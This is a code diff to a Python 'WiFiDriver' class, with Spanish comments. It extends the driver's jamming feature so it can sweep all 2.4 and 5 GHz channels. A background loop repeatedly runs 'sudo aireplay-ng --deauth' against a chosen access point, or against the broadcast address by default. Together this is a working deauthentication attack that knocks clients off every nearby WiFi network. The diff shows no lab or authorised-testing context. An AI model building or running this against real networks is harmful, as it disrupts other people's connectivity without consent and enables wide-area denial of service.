@@ -127,6 +127,10 @@ class WiFiDriver:
         self.capture_active = False
         self.packet_queue = queue.Queue(maxsize=500)
         
+        # Jamming de banda completa
+        self.jam_all_bands_active = False
+        self.jam_thread = None
+        
         # Filtros
         self.bssid_filter: Optional[str] = None
         self.ssid_filter: Optional[str] = None
@@ -759,11 +763,14 @@ class WiFiDriver:
             print(f"ERROR exportando PCAP: {e}")
             return False
     
-    def start_jamming(self, target_bssid: Optional[str] = None, channel: Optional[int] = None) -> bool:
-        """Inicia jamming WiFi usando aireplay-ng con mejor manejo"""
-        if channel:
-            self.set_channel(channel)
+    def start_jamming(self, target_bssid: Optional[str] = None, channel: Optional[int] = None, all_bands: bool = False) -> bool:
+        """Inicia jamming WiFi usando aireplay-ng con mejor manejo
         
+        Args:
+            target_bssid: BSSID objetivo (None = broadcast)
+            channel: Canal específico (None = canal actual)
+            all_bands: Si True, hace jamming en toda la banda cambiando canales
+        """
         # Verificar que aireplay-ng esté disponible
         if not self._check_command_available('aireplay-ng'):
             print("ERROR: aireplay-ng no está instalado. Instala con: sudo apt install aircrack-ng")
@@ -774,21 +781,34 @@ class WiFiDriver:
             if not interface:
                 return False
             
-            # Usar aireplay-ng para deauth attack
-            cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', target_bssid or 'FF:FF:FF:FF:FF:FF', interface]
-            
-            # Ejecutar en background
-            self.jam_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            
-            # Verificar que inició correctamente
-            time.sleep(0.5)
-            if self.jam_process.poll() is not None:
-                # Proceso terminó prematuramente
-                stderr = self.jam_process.stderr.read().decode('utf-8', errors='ignore') if self.jam_process.stderr else ""
-                print(f"ERROR iniciando jamming: {stderr}")
-                return False
-            
-            return True
+            if all_bands:
+                # Jamming de banda completa - usar thread para cambiar canales
+                self.jam_all_bands_active = True
+                self.jam_process = None  # No usamos proceso único
+                self.jam_thread = threading.Thread(target=self._jam_all_bands_loop, 
+                                                   args=(target_bssid,), daemon=True)
+                self.jam_thread.start()
+                return True
+            else:
+                # Jamming en canal específico (comportamiento original)
+                if channel:
+                    self.set_channel(channel)
+                
+                # Usar aireplay-ng para deauth attack
+                cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', target_bssid or 'FF:FF:FF:FF:FF:FF', interface]
+                
+                # Ejecutar en background
+                self.jam_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                
+                # Verificar que inició correctamente
+                time.sleep(0.5)
+                if self.jam_process.poll() is not None:
+                    # Proceso terminó prematuramente
+                    stderr = self.jam_process.stderr.read().decode('utf-8', errors='ignore') if self.jam_process.stderr else ""
+                    print(f"ERROR iniciando jamming: {stderr}")
+                    return False
+                
+                return True
         
         except FileNotFoundError:
             print("ERROR: aireplay-ng no encontrado. Instala con: sudo apt install aircrack-ng")
@@ -797,9 +817,53 @@ class WiFiDriver:
             print(f"ERROR iniciando jamming: {e}")
             return False
     
+    def _jam_all_bands_loop(self, target_bssid: Optional[str] = None):
+        """Loop para jamming en toda la banda cambiando canales"""
+        interface = self.monitor_interface or self.interface
+        if not interface:
+            return
+        
+        # Canales a usar (2.4 GHz y 5 GHz)
+        all_channels = self.CHANNELS_2_4 + self.CHANNELS_5
+        
+        while getattr(self, 'jam_all_bands_active', False):
+            for channel in all_channels:
+                if not getattr(self, 'jam_all_bands_active', False):
+                    break
+                
+                try:
+                    # Cambiar a canal
+                    self.set_channel(channel)
+                    time.sleep(0.1)  # Pequeña pausa para cambio de canal
+                    
+                    # Iniciar deauth en este canal
+                    cmd = ['sudo', 'aireplay-ng', '--deauth', '5', '-a', target_bssid or 'FF:FF:FF:FF:FF:FF', interface]
+                    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    
+                    # Esperar un poco antes de cambiar de canal
+                    time.sleep(0.3)
+                    
+                    # Terminar proceso antes de cambiar de canal
+                    try:
+                        process.terminate()
+                        process.wait(timeout=1)
+                    except:
+                        process.kill()
+                
+                except Exception as e:
+                    # Continuar con siguiente canal si hay error
+                    continue
+    
     def stop_jamming(self):
         """Detiene el jamming con mejor manejo"""
         try:
+            # Detener jamming de banda completa
+            if hasattr(self, 'jam_all_bands_active'):
+                self.jam_all_bands_active = False
+                if hasattr(self, 'jam_thread') and self.jam_thread:
+                    self.jam_thread.join(timeout=2)
+            
+            # Detener proceso de jamming normal
             if hasattr(self, 'jam_process') and self.jam_process:
                 self.jam_process.terminate()
                 try:
